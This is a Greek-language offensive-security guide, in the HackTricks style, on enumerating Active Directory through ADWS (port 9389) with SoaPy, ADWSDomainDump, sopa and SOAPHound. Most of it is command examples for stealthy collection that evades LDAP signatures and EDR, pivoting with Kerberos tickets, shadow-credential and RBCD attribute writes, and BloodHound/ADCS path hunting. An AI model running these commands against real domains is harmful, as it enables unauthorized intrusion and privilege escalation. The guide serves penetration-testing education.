# Enumeration του Active Directory Web Services (ADWS) & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Το Active Directory Web Services (ADWS) είναι **ενεργοποιημένο από προεπιλογή σε κάθε Domain Controller από τα Windows Server 2008 R2 και μετά** και ακούει στη θύρα TCP **9389**. Παρά το όνομά του, **δεν χρησιμοποιείται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα τύπου LDAP μέσω μιας στοίβας ιδιόκτητων .NET framing protocols:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση ενθυλακώνεται μέσα σε αυτά τα binary SOAP frames και μεταδίδεται μέσω μιας ασυνήθιστης θύρας, η **enumeration μέσω ADWS είναι πολύ λιγότερο πιθανό να επιθεωρηθεί, να φιλτραριστεί ή να αναγνωριστεί από signatures σε σύγκριση με την κλασική κίνηση LDAP/389 & 636**. Για τους operators αυτό σημαίνει:<sup>[[1]](#references)[[7]](#references)</sup>

* Πιο stealthy recon – οι Blue teams συχνά επικεντρώνονται στα LDAP queries.
* Δυνατότητα συλλογής από **μη-Windows hosts (Linux, macOS)** μέσω tunnelling της 9389/TCP μέσω SOCKS proxy.
* Τα ίδια δεδομένα που θα αποκτούσατε μέσω LDAP (users, groups, ACLs, schema κ.λπ.) και δυνατότητα εκτέλεσης **writes** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

Οι αλληλεπιδράσεις με το ADWS υλοποιούνται μέσω WS-Enumeration: κάθε query ξεκινά με ένα μήνυμα `Enumerate` που ορίζει το LDAP filter/attributes και επιστρέφει ένα GUID `EnumerationContext`, ενώ ακολουθεί ένα ή περισσότερα μηνύματα `Pull` που μεταδίδουν αποτελέσματα έως το όριο αποτελεσμάτων που ορίζει ο server.<sup>[[7]](#references)</sup> Τα contexts λήγουν μετά από περίπου 30 λεπτά, επομένως τα εργαλεία πρέπει είτε να κάνουν page τα αποτελέσματα είτε να χωρίζουν τα filters (queries με prefix ανά CN), ώστε να μη χαθεί η κατάστασή τους.<sup>[[8]](#references)</sup> Όταν ζητάτε security descriptors, καθορίστε το control `LDAP_SERVER_SD_FLAGS_OID` για να παραλείψετε τα SACLs· διαφορετικά, το ADWS απλώς αφαιρεί το attribute `nTSecurityDescriptor` από την SOAP response.

> ΣΗΜΕΙΩΣΗ: Το ADWS χρησιμοποιείται επίσης από πολλά εργαλεία RSAT GUI/PowerShell, επομένως η κίνηση μπορεί να μοιάζει με νόμιμη δραστηριότητα διαχείρισης.

## SoaPy – Native Python Client

Το [SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης επανυλοποίηση της στοίβας πρωτοκόλλων ADWS σε pure Python**. Κατασκευάζει τα frames NBFX/NBFSE/NNS/NMF byte-for-byte, επιτρέποντας τη συλλογή από Unix-like συστήματα χωρίς χρήση του .NET runtime.<sup>[[1]](#references)[[2]](#references)</sup>

### Βασικά χαρακτηριστικά

* Υποστηρίζει **proxying μέσω SOCKS** (χρήσιμο από C2 implants).
* Λεπτομερή search filters, ίδια με το LDAP `-q '(objectClass=user)'`.
* Στοχευμένες λειτουργίες **write** για RBCD, SPNs, account flags και key credentials.<sup>[[2]](#references)</sup>
* Το output του SOAPy μπορεί να γίνει parse από το **BOFHound** και να εισαχθεί στο BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flag `--parse` για πιο ευανάγνωστη εμφάνιση timestamps / `userAccountControl` όταν απαιτείται αναγνωσιμότητα από άνθρωπο.<sup>[[2]](#references)</sup>

### Flags στοχευμένης συλλογής & λειτουργίες write

Το SoaPy παρέχει επιλεγμένα switches που αναπαράγουν τις συνηθέστερες LDAP hunting εργασίες μέσω ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και τα raw `--query` / `--filter` knobs για προσαρμοσμένα pulls. Συνδυάστε τα με write primitives όπως `--rbcd <source>` (ορίζει το `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (προετοιμασία SPN για στοχευμένο Kerberoasting) και `--asrep` (ενεργοποιεί το `DONT_REQ_PREAUTH` στο `userAccountControl`).<sup>[[2]](#references)</sup>

Παράδειγμα στοχευμένου SPN hunt που επιστρέφει μόνο τα `samAccountName` και `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Χρησιμοποιήστε τον ίδιο host/credentials για να αξιοποιήσετε άμεσα τα ευρήματα: κάντε dump των objects που έχουν ήδη ρυθμιστεί για RBCD με `--rbcds` και, στη συνέχεια, εκτελέστε `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` για να προετοιμάσετε μια αλυσίδα Resource-Based Constrained Delegation (δείτε το [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδρομή κατάχρησης).<sup>[[2]](#references)</sup>

### Εγκατάσταση (host χειριστή)

Εγκαταστήστε την τρέχουσα έκδοση του SOAPy CLI από το upstream repository του· το όνομα του εκτελέσιμου αρχείου κάνει διάκριση πεζών-κεφαλαίων σε συστήματα τύπου Unix.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Συλλογή μόνο με ticket μέσω SOCKS pivot

Αν ένα foothold παρέχει Kerberos ticket αλλά όχι plaintext password, μετατρέψτε ένα ticket `.kirbi` σε `ccache`, όπως περιγράφεται στο [Pass the Ticket](pass-the-ticket.md), και έπειτα κατευθύνετε το SOAPy σε αυτό το cache. Ένα ticket για την υπηρεσία LDAP του DC μπορεί να χρησιμοποιηθεί στην τεκμηριωμένη ροή εργασίας SOAPy ADWS· δρομολογήστε τόσο την κίνηση ADWS όσο και την κίνηση Kerberos μέσω του pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials over ADWS

Αν το τρέχον principal μπορεί να κάνει εγγραφή στο `msDS-KeyCredentialLink` ενός target object, το SOAPy μπορεί να προσθέσει ένα key credential μέσω ADWS και να εξαγάγει το αντίστοιχο PFX. Καταγράψτε το DeviceID που επιστρέφεται, για να το αφαιρέσετε με ακρίβεια, αντί να διαγράψετε ολόκληρο το attribute. Χρησιμοποιήστε το PFX για PKINIT, όπως εξηγείται στο [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump μέσω ADWS (Linux/Windows)

* Fork του `ldapdomaindump` που αντικαθιστά τα LDAP queries με κλήσεις ADWS μέσω TCP/9389, ώστε να μειώσει τις ανιχνεύσεις από LDAP signatures.
* Εκτελεί αρχικό έλεγχο προσβασιμότητας στη θύρα 9389, εκτός αν περαστεί το `--force` (παραλείπει τον έλεγχο αν τα port scans προκαλούν θόρυβο ή φιλτράρονται).
* Έχει δοκιμαστεί με Microsoft Defender for Endpoint και CrowdStrike Falcon, με επιτυχημένη παράκαμψη, όπως αναφέρεται στο README.<sup>[[4]](#references)</sup>

### Εγκατάσταση

```bash
pipx install .
```

### Χρήση

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Η τυπική έξοδος καταγράφει τον έλεγχο προσβασιμότητας της θύρας 9389, το bind στο ADWS και την έναρξη/ολοκλήρωση του dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Ένας πρακτικός client για ADWS σε Golang

Όπως και το soapy, το [sopa](https://github.com/Macmod/sopa) υλοποιεί τη στοίβα πρωτοκόλλων ADWS (MS-NNS + MC-NMF + SOAP) σε Golang και παρέχει flags γραμμής εντολών για την εκτέλεση κλήσεων ADWS όπως:<sup>[[5]](#references)</sup>

* **Αναζήτηση και ανάκτηση αντικειμένων** - `query` / `get`
* **Κύκλος ζωής αντικειμένων** - `create [user|computer|group|ou|container|custom]` και `delete`
* **Επεξεργασία attributes** - `attr [add|replace|delete]`
* **Διαχείριση λογαριασμών** - `set-password` / `change-password`
* και άλλα, όπως `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` κ.λπ.

### Βασικά σημεία αντιστοίχισης πρωτοκόλλων

* Οι αναζητήσεις τύπου LDAP εκτελούνται μέσω **WS-Enumeration** (`Enumerate` + `Pull`), με προβολή attributes, έλεγχο scope (Base/OneLevel/Subtree) και σελιδοποίηση.
* Η ανάκτηση μεμονωμένου αντικειμένου χρησιμοποιεί το **WS-Transfer** `Get`· οι αλλαγές attributes χρησιμοποιούν το `Put` και οι διαγραφές το `Delete`.
* Η ενσωματωμένη δημιουργία αντικειμένων χρησιμοποιεί το **WS-Transfer ResourceFactory**· για custom αντικείμενα χρησιμοποιείται ένα **IMDA AddRequest** που βασίζεται σε πρότυπα YAML.
* Οι λειτουργίες κωδικών πρόσβασης είναι ενέργειες **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ανακάλυψη metadata χωρίς πιστοποίηση (mex)

Το ADWS εκθέτει το WS-MetadataExchange χωρίς διαπιστευτήρια, προσφέροντας έναν γρήγορο τρόπο επιβεβαίωσης της έκθεσης πριν από την πιστοποίηση:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Σημειώσεις για τον εντοπισμό DNS/DC και τη στόχευση Kerberos

Το Sopa μπορεί να εντοπίσει DC μέσω SRV, αν παραλειφθεί το `--dc` και δοθεί το `--domain`. Εκτελεί ερωτήματα με την εξής σειρά και χρησιμοποιεί τον στόχο με την υψηλότερη προτεραιότητα:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Σε επιχειρησιακό επίπεδο, προτιμήστε έναν resolver που ελέγχεται από DC για να αποφύγετε αποτυχίες σε περιβάλλοντα με τμηματοποίηση:

* Χρησιμοποιήστε `--dns <DC-IP>` ώστε **όλα** τα SRV/PTR/forward lookups να περνούν από το DNS του DC.
* Χρησιμοποιήστε `--dns-tcp` όταν το UDP είναι αποκλεισμένο ή οι απαντήσεις SRV είναι μεγάλες.
* Αν το `--dc` είναι IP, το sopa εκτελεί πάντα αναζήτηση **reverse PTR**: το φίλτρο διεύθυνσης `wsa:To` του ADWS απαιτεί FQDN ακόμη και χωρίς Kerberos. Δώστε απευθείας ένα FQDN DC αν λείπει η reverse zone.<sup>[[5]](#references)</sup>

Παράδειγμα (IP + Kerberos, εξαναγκασμένο DNS μέσω του DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Επιλογές υλικού αυθεντικοποίησης

Εκτός από κωδικούς πρόσβασης σε plaintext, το sopa υποστηρίζει **NT hashes**, **Kerberos AES keys**, **ccache** και **PKINIT certificates** (PFX ή PEM) για αυθεντικοποίηση ADWS. Η χρήση των `--aes-key`, `-c` (ccache) ή των επιλογών που βασίζονται σε certificates υποδηλώνει Kerberos.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Δημιουργία προσαρμοσμένων αντικειμένων μέσω templates

Για αυθαίρετες κλάσεις αντικειμένων, η εντολή `create custom` χρησιμοποιεί ένα YAML template που αντιστοιχεί σε ένα IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* Τα `parentDN` και `rdn` ορίζουν το container και το relative DN.
* Το `attributes[].name` υποστηρίζει `cn` ή namespaced `addata:cn`.
* Το `attributes[].type` δέχεται `string|int|bool|base64|hex` ή ρητό `xsd:*`.
* **Μην** συμπεριλάβετε τα `ad:relativeDistinguishedName` ή `ad:container-hierarchy-parent`· το sopa τα εισάγει αυτόματα.
* Οι τιμές `hex` μετατρέπονται σε `xsd:base64Binary`· χρησιμοποιήστε `value: ""` για να ορίσετε κενές συμβολοσειρές.

## SOAPHound – Συλλογή ADWS μεγάλου όγκου (Windows)

Το [FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας collector .NET που διατηρεί όλες τις αλληλεπιδράσεις LDAP εντός του ADWS και εξάγει JSON συμβατό με το BloodHound v4. Δημιουργεί μία φορά πλήρη cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` (`--buildcache`) και έπειτα την επαναχρησιμοποιεί για περάσματα `--bhdump`, `--certdump` (ADCS) ή `--dnsdump` (DNS ενσωματωμένο στο AD) μεγάλου όγκου, ώστε μόνο ~35 κρίσιμα attributes να φεύγουν ποτέ από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) χωρίζει αυτόματα τα queries με βάση το πρόθεμα CN, ώστε να παραμένουν κάτω από το χρονικό όριο των 30 λεπτών του EnumerationContext σε μεγάλα forests.<sup>[[8]](#references)</sup>

Τυπική ροή εργασίας σε VM χειριστή συνδεδεμένο στο domain:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Τα εξαγόμενα JSON εισάγονται απευθείας σε ροές εργασίας SharpHound/BloodHound — δείτε τη [μεθοδολογία BloodHound](bloodhound.md) για ιδέες σχετικά με την απεικόνιση γράφων. Το AutoSplit καθιστά το SOAPHound ανθεκτικό σε forests με εκατομμύρια αντικείμενα, διατηρώντας παράλληλα χαμηλότερο αριθμό queries από τα snapshots τύπου ADExplorer.

## Ροή εργασίας για διακριτική συλλογή AD

Η παρακάτω ροή εργασίας δείχνει πώς να απαριθμήσετε **αντικείμενα domain και ADCS** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να αναζητήσετε attack paths που βασίζονται σε πιστοποιητικά — όλα από Linux:

1. **Δημιουργήστε tunnel για το 9389/TCP** από το δίκτυο-στόχο προς το μηχάνημά σας (π.χ. μέσω Chisel, Meterpreter, SSH dynamic port-forward κ.λπ.). Δρομολογήστε τον raw TCP client μέσω SOCKS με `proxychains4 SOAPy ...` (ρυθμίστε τη διεύθυνση SOCKS5 στο `proxychains4.conf`)· το `HTTPS_PROXY` δεν κάνει proxy αυτό το μη-HTTP πρωτόκολλο.<sup>[[9]](#references)</sup>

2. **Συλλέξτε το αντικείμενο του root domain:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Συλλέξτε αντικείμενα σχετικά με το ADCS από το Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Μετατροπή σε BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Ανεβάστε το ZIP** στο GUI του BloodHound και εκτελέστε cypher queries όπως το `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψετε διαδρομές κλιμάκωσης πιστοποιητικών (ESC1, ESC8 κ.λπ.).

### Εγγραφή του `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Με δικαίωμα εγγραφής στο αντικείμενο του υπολογιστή-στόχου, χρησιμοποιήστε το RBCD action του SOAPy αντί για μια ακατέργαστη συμβολοσειρά security descriptor. Εδώ, το `WEBSRV01$` είναι η ελεγχόμενη πηγή και το `FILE01$` είναι ο στόχος του οποίου το attribute αλλάζει.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Συνεχίστε την αλυσίδα Kerberos S4U στο [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Σύνοψη εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|---------|------|-------|
| Απαρίθμηση ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, ανάγνωση/εγγραφή |
| Μαζική εξαγωγή ADWS μεγάλου όγκου | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, πρώτα cache, λειτουργίες BH/ADCS/DNS |
| Εισαγωγή στο BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει logs SoaPy/ldapsearch |
| Παραβίαση πιστοποιητικών | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να δρομολογηθεί μέσω του ίδιου SOCKS |
| Απαρίθμηση ADWS και αλλαγές αντικειμένων | [sopa](https://github.com/Macmod/sopa) | Γενικός client για διασύνδεση με γνωστά endpoints ADWS - επιτρέπει απαρίθμηση, δημιουργία αντικειμένων, τροποποίηση attributes και αλλαγή κωδικών πρόσβασης |



## References

- [1] [SpecterOps – Φροντίστε να χρησιμοποιείτε SOAP(y) – Οδηγός για χειριστές σχετικά με τη διακριτική συλλογή δεδομένων AD μέσω ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy στο GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound στο GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump στο GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa στο GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Προδιαγραφές MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Διακριτική απαρίθμηση περιβαλλόντων Active Directory μέσω ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Εργαλείο SOAPHound για συλλογή δεδομένων Active Directory μέσω ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki SOAPy – Αναγνώριση](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki SOAPy – Μετά την εκμετάλλευση](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
